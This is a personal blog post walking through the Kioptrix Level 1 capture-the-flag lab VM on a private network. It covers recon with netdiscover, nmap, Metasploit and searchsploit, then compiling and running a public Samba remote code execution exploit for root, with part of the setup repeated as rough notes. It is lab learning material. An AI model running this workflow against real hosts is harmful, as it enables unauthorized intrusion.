---
layout: post
title: Kioptrix Level 1 Walkthrough
date: 2018-09-24
excerpt: "Kioptrix 1 Write-Up"
tags: [ctf, cybersec, kioptrix, nmap, metasploit]
comments: true
---

# Kioptrix Level 1
Kioptrix consists of five capture-the-flag virtual machine challenges. I intend to write about my methodology of solving each of them in time. This is the first (and easiest). These have been solved many times by people before me, but I feel they represent a good challenge and that documenting my efforts is key to learning.

You can find the VM for download over at [Vulnhub](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/).

## My Setup
Currently, I run Kali in a VM using Virtualbox. I have Kioptrix and any other CTF VMs on a shared NatNetwork with Kali. This way Kali has internet access, target VM access, and it keeping everything behind NAT.

*Note: I have my NatNetwork set with a DHCP server with an IP address range of 10.0.2.0/24*

## VM Discovery
We'll need to get the IP address of the target before we can interact with it.

{% highlight bash %}
root@kali:~# netdiscover -r 10.0.2.0/24

Currently scanning: Finished!   |   Screen View: Unique Hosts                 

4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240               
_____________________________________________________________________________
  IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
-----------------------------------------------------------------------------
...
10.0.2.6        08:00:27:3b:a7:21      1      60  PCS Systemtechnik GmbH     
{% endhighlight %}

I'm running a Kali VM in Virtualbox. For getting Kioptrix #1 to work in Vbox, see this guide: https://www.hypn.za.net/blog/2017/07/15/running-kioptrix-level-1-and-others-in-virtualbox/

VM Discovery
I had these set to NatNetwork, so they can access the internet, communite, but still be inaccessible from the outside.
netdiscover -r 10.0.2.0/24

VM ended up being on 10.0.2.6

Nmap Port Scan: nmap -p- -v -sV 10.0.2.6
22 OpenSSH 2.9p2 (protocol 1.99)
80 Apache httpd 1.3.20 ((Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
111 rpcbind
139 Samba smbd
443 Apache ^
32768 status

More enumeration via enum4linux
Not much in here, but to check Samba version, will try MSF's samba scanner.
msf > use auxiliary/scanner/smb/smb_version

Set RHOSTS to our VM at 10.0.2.6

Running it revealed Samba 2.2.1a

Used searchsploit to find exploits

searchsploit samba 2.2

The last one looked promisng
"Samba < 2.2.8 (Linux/BSD) - Remote Code Execution | exploits/multiple/remote/10.c"

Copied the file to pwd, ran gcc on it, then a quick
./a.out 10.0.2.6
worked great. Instant root.
